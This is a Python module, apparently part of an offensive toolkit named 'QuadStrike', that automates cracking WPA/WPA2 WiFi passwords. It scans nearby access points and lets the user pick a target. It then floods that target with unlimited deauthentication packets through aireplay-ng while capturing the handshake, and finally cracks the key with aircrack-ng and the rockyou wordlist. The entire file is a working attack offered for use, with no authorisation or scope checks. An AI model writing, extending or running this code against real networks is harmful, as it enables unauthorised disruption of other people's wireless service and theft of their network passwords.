#!/usr/bin/env python3
"""
QuadStrike - WiFi Password Cracking Module
Captures WPA/WPA2 handshake and cracks passwords
"""

import subprocess
import csv
import os
import time
from datetime import datetime
from color import *
from utils import list_all_interfaces, check_for_essid

def wifi_password_crack():
    """WiFi password cracking module - Performs deauthentication and captures handshake"""
    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{ORANGE}{BOLD}{'🔐  WiFi PASSWORD CRACK MODULE  🔐':^92}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    # Get all interfaces
    all_ifaces = list_all_interfaces()
    if len(all_ifaces) == 0:
        print(f"\n{RED}[✗] No network interfaces detected. Please connect an adapter and try again.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Detected network interfaces:{RESET}")
    print(f"{GOLD}{'─' * 85}{RESET}")
    for idx, iface in enumerate(all_ifaces):
        wflag = f"{GREEN}Wireless{RESET}" if iface["is_wireless"] else f"{CYAN}Wired{RESET}"
        mac_display = iface["mac"] if iface["mac"] else "unknown"
        print(f"{GOLD}    [{BRIGHT_GOLD}{idx}{GOLD}] ➤ {ORANGE}{iface['name']:12}{GOLD}  {wflag:16}  MAC: {CYAN}{mac_display}{RESET}")
    print(f"{GOLD}{'─' * 85}{RESET}")

    # Let user pick an interface
    while True:
        sel = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Select interface index (must be wireless): {ORANGE}")
        print(RESET, end='')
        try:
            sel_i = int(sel)
            if sel_i < 0 or sel_i >= len(all_ifaces):
                raise ValueError
            chosen = all_ifaces[sel_i]
            break
        except Exception:
            print(f"{RED}[✗] Please enter a valid number from the list above.{RESET}")

    # Ensure the chosen interface is wireless
    if not chosen["is_wireless"]:
        print(f"\n{RED}[✗] Interface {chosen['name']} is not wireless. Wireless adapter required.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    hacknic = chosen["name"]
    print(f"\n{GOLD}[{GREEN}✓{GOLD}] Using wireless interface: {ORANGE}{hacknic}{RESET}")
    
    print(f"{GOLD}[{GREEN}+{GOLD}] Killing conflicting processes...{RESET}")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{GOLD}[{GREEN}+{GOLD}] Putting WiFi adapter into monitor mode...{RESET}")
    subprocess.run(["sudo", "airmon-ng", "start", hacknic])
    
    # Wait for interface to be ready
    time.sleep(2)

    # Start airodump-ng
    monitor_iface = hacknic + "mon"
    
    print(f"{GOLD}[{GREEN}+{GOLD}] Starting network scan on {ORANGE}{monitor_iface}{RESET}...{RESET}")
    
    discover_access_points = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    # Give airodump-ng time to start
    time.sleep(3)

    # Scanning loop
    active_wireless_networks = []
    try:
        while True:
            subprocess.call("clear", shell=True)
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print(f"{GOLD}[{GREEN}+{GOLD}] Scanning networks... Press {RED}Ctrl+C{GOLD} to select target.{RESET}\n")
            print(f"{GOLD}No  │ BSSID              │ Channel │ ESSID{RESET}")
            print(f"{GOLD}────┼────────────────────┼─────────┼──────────────────────────────{RESET}")
            for index, item in enumerate(active_wireless_networks):
                print(f"{ORANGE}{index:2}{GOLD}  │ {CYAN}{item['BSSID']}{GOLD} │ {BRIGHT_GOLD}{item['channel'].strip():^7}{GOLD} │ {ORANGE}{item['ESSID']}{RESET}")
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n{GOLD}[{GREEN}✓{GOLD}] Ready to select target.{RESET}")

    # Stop scanning
    discover_access_points.kill()

    # Select target
    while True:
        choice = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Select target number: {ORANGE}")
        print(RESET, end='')
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print(f"{RED}[✗] Please try again.{RESET}")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
    hackessid = active_wireless_networks[int(choice)]["ESSID"]

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Target: {ORANGE}{hackessid}{GOLD} ({CYAN}{hackbssid}{GOLD}) on channel {BRIGHT_GOLD}{hackchannel}{RESET}")
    
    # Set channel for monitor interface
    subprocess.run(["sudo", "airmon-ng", "start", monitor_iface, hackchannel])
    time.sleep(1)

    # Ask user for capture file name
    print(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Enter filename to save capture (without .cap extension): {ORANGE}", end='')
    capture_file = input().strip()
    print(RESET, end='')
    
    # Default filename if user doesn't provide one
    if not capture_file:
        capture_file = f"handshake_{hackessid.replace(' ', '_')}"
    
    # Remove .cap extension if user added it
    if capture_file.endswith('.cap'):
        capture_file = capture_file[:-4]
    
    print(f"\n{GOLD}[{GREEN}+{GOLD}] Capture will be saved as: {ORANGE}{capture_file}.cap{RESET}")
    
    # Detect available terminal emulator for handshake capture window
    print(f"{GOLD}[{GREEN}+{GOLD}] Opening handshake capture window...{RESET}")
    
    terminals = [
        ["gnome-terminal", "--", "sudo", "airodump-ng", "-w", capture_file, "--bssid", hackbssid, "-c", hackchannel, monitor_iface],
        ["xterm", "-e", "sudo", "airodump-ng", "-w", capture_file, "--bssid", hackbssid, "-c", hackchannel, monitor_iface],
        ["konsole", "-e", "sudo", "airodump-ng", "-w", capture_file, "--bssid", hackbssid, "-c", hackchannel, monitor_iface],
        ["xfce4-terminal", "-e", f"sudo airodump-ng -w {capture_file} --bssid {hackbssid} -c {hackchannel} {monitor_iface}"],
    ]
    
    handshake_capture = None
    for term_cmd in terminals:
        try:
            handshake_capture = subprocess.Popen(term_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{GOLD}[{GREEN}✓{GOLD}] Opened handshake capture window using {term_cmd[0]}{RESET}")
            break
        except FileNotFoundError:
            continue
    
    if handshake_capture is None:
        print(f"{ORANGE}[!] No terminal emulator found. Running capture in background...{RESET}")
        handshake_capture = subprocess.Popen(
            ["sudo", "airodump-ng", "-w", capture_file, "--bssid", hackbssid, "-c", hackchannel, monitor_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    # Wait for capture to start
    time.sleep(2)

    # Open deauthentication attack in another window
    print(f"{GOLD}[{GREEN}+{GOLD}] Opening deauthentication attack window...{RESET}")
    
    deauth_terminals = [
        ["gnome-terminal", "--", "sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, monitor_iface],
        ["xterm", "-e", "sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, monitor_iface],
        ["konsole", "-e", "sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, monitor_iface],
        ["xfce4-terminal", "-e", f"sudo aireplay-ng --deauth 0 -a {hackbssid} {monitor_iface}"],
    ]
    
    deauth_process = None
    for term_cmd in deauth_terminals:
        try:
            deauth_process = subprocess.Popen(term_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{GOLD}[{GREEN}✓{GOLD}] Opened deauthentication window using {term_cmd[0]}{RESET}")
            break
        except FileNotFoundError:
            continue
    
    if deauth_process is None:
        print(f"{ORANGE}[!] No terminal emulator found. Running deauth in background...{RESET}")
        deauth_process = subprocess.Popen(
            ["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, monitor_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{CYAN}{BOLD}{'ATTACK IN PROGRESS':^83}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╠{'═' * 83}╣{RESET}")
    print(f"{GOLD}║  {ORANGE}Window 1:{GOLD} Deauthentication attack running                                   ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Window 2:{GOLD} Handshake capture running                                        ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Target:{GOLD} {hackessid:<69} ║{RESET}")
    print(f"{GOLD}║  {ORANGE}BSSID:{GOLD} {hackbssid:<70} ║{RESET}")
    print(f"{GOLD}║  {ORANGE}File:{GOLD} {capture_file}.cap{' ' * (70 - len(capture_file))}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    print(f"\n{GOLD}[{CYAN}i{GOLD}] Watch Window 2 for 'WPA handshake: {hackbssid}' message{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Once handshake is captured, press Enter to stop both attacks{RESET}")
    
    input(f"\n{GOLD}Press Enter when handshake is captured (or to stop)...{RESET}")

    # Kill both processes
    print(f"\n{GOLD}[{GREEN}+{GOLD}] Stopping attacks...{RESET}")
    
    try:
        deauth_process.terminate()
        time.sleep(1)
        deauth_process.kill()
    except:
        pass
    
    try:
        handshake_capture.terminate()
        time.sleep(1)
        handshake_capture.kill()
    except:
        pass
    
    # Kill any remaining processes
    try:
        subprocess.run(["sudo", "pkill", "-9", "aireplay-ng"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-9", "airodump-ng"], stderr=subprocess.DEVNULL)
    except:
        pass

    # Find the capture file
    cap_file = None
    for file_name in os.listdir():
        if file_name.startswith(capture_file) and file_name.endswith(".cap"):
            cap_file = file_name
            break

    if not cap_file:
        print(f"\n{RED}[✗] No .cap file found!{RESET}")
        print(f"{GOLD}[{CYAN}i{GOLD}] Expected file: {capture_file}-XX.cap{RESET}")
        print(f"{GOLD}[{CYAN}i{GOLD}] Handshake may not have been captured.{RESET}")
    else:
        print(f"\n{GOLD}[{GREEN}✓{GOLD}] Capture complete!{RESET}")
        
        # Display capture file info
        print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
        print(f"{GOLD}║{CYAN}{BOLD}{'CAPTURE FILE DETAILS':^83}{RESET}{GOLD}║{RESET}")
        print(f"{GOLD}╠{'═' * 83}╣{RESET}")
        print(f"{GOLD}║  {ORANGE}File:{GOLD} {cap_file:<73} ║{RESET}")
        print(f"{GOLD}║  {ORANGE}BSSID:{GOLD} {hackbssid:<72} ║{RESET}")
        print(f"{GOLD}║  {ORANGE}ESSID:{GOLD} {hackessid:<72} ║{RESET}")
        
        # Check file size
        try:
            file_size = os.path.getsize(cap_file)
            file_size_kb = file_size / 1024
            print(f"{GOLD}║  {ORANGE}Size:{GOLD} {file_size_kb:.2f} KB{' ' * 68} ║{RESET}")
        except:
            pass
        
        print(f"{GOLD}║  {ORANGE}Location:{GOLD} {os.path.abspath(cap_file):<66} ║{RESET}")
        print(f"{GOLD}╚{'═' * 83}╝{RESET}")
        
        # Ask user if they want to crack the password now
        print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
        print(f"{GOLD}║{CYAN}{BOLD}{'PASSWORD CRACKING':^83}{RESET}{GOLD}║{RESET}")
        print(f"{GOLD}╚{'═' * 83}╝{RESET}")
        
        crack_now = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Do you want to crack the password now? (y/n): {ORANGE}")
        print(RESET, end='')
        
        if crack_now.lower() == 'y':
            # Ask for the capture file name to crack
            print(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Enter the .cap filename you want to crack: {ORANGE}")
            print(f"{GOLD}[{CYAN}i{GOLD}] Available file: {ORANGE}{cap_file}{RESET}")
            crack_filename = input(f"{GOLD}[{BRIGHT_GOLD}?{GOLD}] Filename (press Enter to use {ORANGE}{cap_file}{GOLD}): {ORANGE}")
            print(RESET, end='')
            
            # Use the captured file if user just presses Enter
            if not crack_filename.strip():
                crack_filename = cap_file
            
            # Check if the file exists
            if not os.path.exists(crack_filename):
                print(f"\n{RED}[✗] File not found: {crack_filename}{RESET}")
                print(f"{GOLD}[{CYAN}i{GOLD}] Please make sure the file exists and try again.{RESET}")
            else:
                # Display cracking information
                print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
                print(f"{GOLD}║{CYAN}{BOLD}{'STARTING PASSWORD CRACKING':^83}{RESET}{GOLD}║{RESET}")
                print(f"{GOLD}╠{'═' * 83}╣{RESET}")
                print(f"{GOLD}║  {ORANGE}Tool:{GOLD} aircrack-ng                                                           ║{RESET}")
                print(f"{GOLD}║  {ORANGE}File:{GOLD} {crack_filename:<73} ║{RESET}")
                print(f"{GOLD}║  {ORANGE}Wordlist:{GOLD} /usr/share/wordlists/rockyou.txt                                 ║{RESET}")
                print(f"{GOLD}║  {ORANGE}Target:{GOLD} {hackbssid:<72} ║{RESET}")
                print(f"{GOLD}╚{'═' * 83}╝{RESET}")
                
                print(f"\n{GOLD}[{CYAN}i{GOLD}] This may take a while depending on the wordlist size...{RESET}")
                print(f"{GOLD}[{CYAN}i{GOLD}] Press Ctrl+C to stop cracking at any time{RESET}\n")
                
                input(f"{GOLD}Press Enter to start cracking...{RESET}")
                
                # Run aircrack-ng
                print(f"\n{GOLD}{'═' * 85}{RESET}")
                print(f"{GOLD}[{GREEN}+{GOLD}] Running aircrack-ng...{RESET}\n")
                
                try:
                    # Run aircrack-ng with output displayed to user (not captured)
                    subprocess.run([
                        "aircrack-ng",
                        crack_filename,
                        "-w", "/usr/share/wordlists/rockyou.txt"
                    ])
                    
                    print(f"\n{GOLD}{'═' * 85}{RESET}")
                    
                    # After aircrack-ng closes, check if password was found
                    # Look for the result in aircrack-ng's output by checking the .cap file
                    print(f"\n{GOLD}[{CYAN}i{GOLD}] Checking if password was cracked...{RESET}")
                    
                    # Try to show the cracked password using aircrack-ng with the same file
                    # If password was found, it will be in the output
                    check_result = subprocess.run([
                        "aircrack-ng",
                        crack_filename
                    ], capture_output=True, text=True, timeout=5)
                    
                    # Check if password was found in output
                    if "KEY FOUND" in check_result.stdout or "KEY FOUND" in check_result.stderr:
                        print(f"\n{GREEN}[✓] Password cracking completed successfully!{RESET}")
                        
                        # Extract and display the password
                        print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
                        print(f"{GOLD}║{GREEN}{BOLD}{'PASSWORD CRACKED!':^83}{RESET}{GOLD}║{RESET}")
                        print(f"{GOLD}╚{'═' * 83}╝{RESET}\n")
                        
                        # Find the KEY FOUND line
                        output_text = check_result.stdout + check_result.stderr
                        for line in output_text.split('\n'):
                            if "KEY FOUND" in line:
                                print(f"{GREEN}{BOLD}{line.strip()}{RESET}\n")
                                break
                        
                        print(f"{GOLD}[{GREEN}✓{GOLD}] Password successfully cracked!{RESET}")
                    else:
                        print(f"\n{ORANGE}[!] Password not found in wordlist{RESET}")
                        print(f"{GOLD}[{CYAN}i{GOLD}] The password may not be in rockyou.txt{RESET}")
                        print(f"{GOLD}[{CYAN}i{GOLD}] Try a different or larger wordlist{RESET}")
                        
                except KeyboardInterrupt:
                    print(f"\n\n{GOLD}[{ORANGE}!{GOLD}] Cracking interrupted by user{RESET}")
                except subprocess.TimeoutExpired:
                    print(f"\n{ORANGE}[!] Could not verify if password was cracked{RESET}")
                except FileNotFoundError:
                    print(f"\n{RED}[✗] aircrack-ng not found. Please install it:{RESET}")
                    print(f"{GOLD}    {ORANGE}sudo apt-get install aircrack-ng{RESET}")
                except Exception as e:
                    print(f"\n{RED}[✗] Error running aircrack-ng: {str(e)}{RESET}")
        else:
            print(f"\n{GOLD}[{CYAN}i{GOLD}] You can crack the password later using:{RESET}")
            print(f"{GOLD}    {ORANGE}aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt{RESET}")
    
    input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
